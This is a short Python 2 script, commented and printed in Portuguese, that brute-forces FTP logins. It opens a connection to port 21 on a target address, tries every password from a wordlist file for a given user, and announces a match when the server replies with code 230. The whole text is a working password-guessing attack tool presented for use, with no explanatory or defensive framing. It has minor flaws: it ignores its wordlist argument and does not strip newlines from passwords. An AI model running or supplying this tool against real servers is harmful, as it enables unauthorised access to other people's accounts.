#!/usr/bin/python
import socket
import sys
import re

if len(sys.argv) < 3:
	print "Modo de usar: python bruteforce.py 127.0.0.1 usuario wordlist"
	sys.exit(0)

usuario = sys.argv[2]

f = open("lista.txt")
for linha in f.readlines():
	print "Testando com : %s | %s" %(usuario,linha)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((sys.argv[1],21))
	s.recv(1024)
	s.send("USER " + usuario + "\r\n")
	s.recv(1024)
	s.send("PASS " + linha + "\r\n")
	resultado = s.recv(1024)
	s.send("QUIT \r\n")

	if re.search("230",resultado):
		print "[+] ===> SENHA ENCONTRADA <=== : %s" %(linha)
		break
	else:
		print "[-] Acesso negado [-]\n"



